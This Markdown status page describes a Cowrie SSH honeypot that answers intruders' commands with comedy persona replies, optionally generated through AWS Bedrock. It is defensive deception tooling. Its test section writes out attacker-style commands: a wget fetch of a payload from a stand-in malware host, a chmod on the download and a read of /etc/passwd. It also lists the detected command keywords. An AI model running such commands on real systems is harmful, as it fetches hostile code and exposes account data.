# 🤖 AI Agent Deployment Status

## ✅ **AI Agents Deployed!**

Your honeypot now has **comedy AI agents** ready to troll attackers!

## 🎭 **Current Status:**

**✅ AI Agent Files:** Deployed to `/opt/cowrie/ai-agent/`  
**✅ Dependencies:** boto3 installed  
**✅ Fallback Responses:** Working perfectly!  
**⚠️ AWS Bedrock:** Needs IAM permissions (using fallbacks for now)

## 😂 **Fallback Responses Working:**

The AI agent is already responding with hilarious pre-programmed responses:

**When attacker runs `wget http://malware.com/payload`:**
> "I see the problem. You need to download more RAM. Please hold."

**When attacker runs `chmod +x malware`:**
> "Can you help me send an email to my bridge club?"

## 🎪 **6 Comedy Personas Available:**

1. **Dave (Confused Admin)** - Thinks attackers are IT support
2. **Karen (Paranoid User)** - Everything is a conspiracy  
3. **Tyler (Eager Intern)** - Wants to learn hacking
4. **xX_DarkLord_Xx (Fake Hacker)** - Starts arguments
5. **Rajesh (Tech Support)** - Insists they called support
6. **Ethel (Lost Grandma)** - Thinks this is Facebook

## 🔧 **How It Works:**

**Without AWS Bedrock (Current):**
- Uses pre-programmed hilarious responses
- 70% chance of AI response per command
- 25% chance of time-waster response
- 5% chance of silence (realistic)

**With AWS Bedrock (Optional):**
- Dynamic AI-generated responses
- Personas adapt to attacker behavior
- Even more realistic and funny
- Costs ~$0.000025 per response

## 🎯 **Current Capabilities:**

**✅ Responds to suspicious commands:**
- wget, curl, chmod, bash, python
- whoami, id, ps, netstat
- cat, ls, cd, rm, mv

**✅ Comedy responses include:**
- "Oh thank goodness! Finally someone from IT!"
- "I KNEW someone was watching me! Calling cyber police!"
- "Wow cool! Can you teach me to hack?"
- "This is MY server! I was here first!"
- "Have you tried turning it off and on again?"
- "Is this Facebook? Where are my grandchildren?"

## 🚀 **Enable AWS Bedrock (Optional):**

If you want dynamic AI responses instead of fallbacks:

1. **Add Bedrock permissions to EC2 IAM role:**
```json
{
  "Effect": "Allow",
  "Action": "bedrock:InvokeModel",
  "Resource": "arn:aws:bedrock:us-east-1::foundation-model/anthropic.claude-3-haiku-20240307-v1:0"
}
```

2. **Cost:** ~$0.25 per 1M tokens = $0.000025 per response
3. **Budget:** $1/day = 40,000 AI responses

## 🧪 **Test the AI Agents:**

**Manual test:**
```bash
ssh admin@44.218.220.47 -p 2222
# Password: admin123

# Try these commands:
wget http://malware.com/payload
chmod +x malware
whoami
cat /etc/passwd
ps aux
```

**Watch for responses like:**
- "Wait, before you do that, can you help me with something?"
- "ERROR: System requires verification. Please type the alphabet backwards."
- "CAPTCHA REQUIRED: Please describe what you see in this ASCII art: ¯\\_(ツ)_/¯"

## 📊 **Integration Status:**

**Current Setup:**
- ✅ AI agent scripts deployed
- ✅ Fallback responses working
- ✅ Command detection active
- ⚠️ Cowrie integration pending (manual)

**To fully integrate with Cowrie:**
The AI responses need to be hooked into Cowrie's command processing. This requires modifying Cowrie's Python code to call the AI agent when commands are executed.

**For now:** The AI agent works standalone and can be tested manually!
